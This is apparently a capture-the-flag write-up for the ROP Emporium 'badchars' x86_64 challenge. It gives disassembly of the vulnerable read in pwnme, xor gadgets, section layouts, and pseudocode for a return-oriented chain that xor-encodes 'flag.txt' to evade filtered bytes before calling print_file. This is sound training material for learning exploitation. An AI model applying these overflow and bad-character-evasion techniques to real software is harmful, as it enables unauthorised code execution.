#### Sections
```asm
[Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align

[18] .init_array       INIT_ARRAY       0000000000600df0  00000df0
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       0000000000600df8  00000df8
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .dynamic          DYNAMIC          0000000000600e00  00000e00
       00000000000001f0  0000000000000010  WA       6     0     8
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
```

#### usefulFunction in badchars.elf
```asm
; Attributes: bp-based frame

usefulFunction proc near
; __unwind {
push    rbp
mov     rbp, rsp
mov     edi, offset aNonexistent ; "nonexistent"
call    _print_file
nop
pop     rbp
retn
; } // starts at 400617
usefulFunction endp
```

#### pwnme in libbadchars.so
```asm
; Attributes: bp-based frame

public pwnme
pwnme proc near

; __unwind {
...
lea     rdi, badcharacters+4 ; s
call    _puts
lea     rdi, s          ; "x86_64\n"
call    _puts
lea     rax, [rbp+var_40]
add     rax, 20h ; ' '
mov     edx, 20h ; ' '  ; n
mov     esi, 0          ; c
mov     rdi, rax        ; s
call    _memset
lea     rdi, aBadcharsAreXGA ; "badchars are: 'x', 'g', 'a', '.'"
call    _puts
lea     rdi, format     ; "> "
mov     eax, 0
call    _printf
lea     rax, [rbp+var_40]
add     rax, 20h ; ' '
mov     edx, 200h       ; nbytes
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read
mov     [rbp+var_40], rax
mov     [rbp+var_38], 0
jmp     short loc_9EB
```
```
"badchars are: 'x', 'g', 'a', '.'"

hex['x', 'g', 'a', '.'] == 0x78 0x67 0x61 0x2e
```
`var_40` seems to be the buffer loaded in for the call to `_read`

```asm
  var_40= qword ptr -40h
  var_38= qword ptr -38h
  var_30= qword ptr -30h
  var_20= byte ptr -20h
```
`_print_file` function is just the same as in write4


#### potential gadgets to xor/un-xor bytes within the binary
```
[INFO] File: badchars
0x0000000000400628: xor byte ptr [r15], r14b; ret;
0x0000000000400629: xor byte ptr [rdi], dh; ret;
```

It seems logical to only encode the command we want to run. 
The `.data` section has 16 bytes available to write and is normally a safe area.
`.dynamic` has a lot more space but i'm afraid of overwriting critical data. I dont know anything about this section.

```sh
[lemur@archlinux](badchars)$ objdump -s -j .data badchars

badchars:     file format elf64-x86-64

Contents of section .data:
 601028 00000000 00000000 00000000 00000000  ................

```

Writing the self-decrypting instructions to `.data` and redirecting control-flow to point there will be the goal.
The encoding/wrapping the instructions will need to come first.

#### Pseudocode
```
nop * 0x20 + 8
string = "flag.txt" 
if (bad_char) in string ->

	xor c
	pop r14;
	pop r15
	bytekey
	location + i
	xor byte [r15], r14;

;write;
for len of string ->
pop r12;
pop r13;
string[i]
location + i
mov qword [r13], r12

;final;
pop_rdi
location
system/print_file
```
As it turned out, the address for `.data` had one of the bad characters while incrementing. `.bss` was chosen instead.
My script was close, but did not account for endianess of the xor'd characters, nor did it check for null-termination of strings or padding/alignment. 
Also, did not consider double-encoding for bad xor characters (simply exited with error prior).

I absolutely hate python, so just choose a key that does not generate bad characters.
Also, choose a section who's address will not produce bad characters when iterated over for the length of the string.

The string copy operation will only work with this simple chain if the string is <= 8 bytes as it's not exactly a proper strcpy implementation
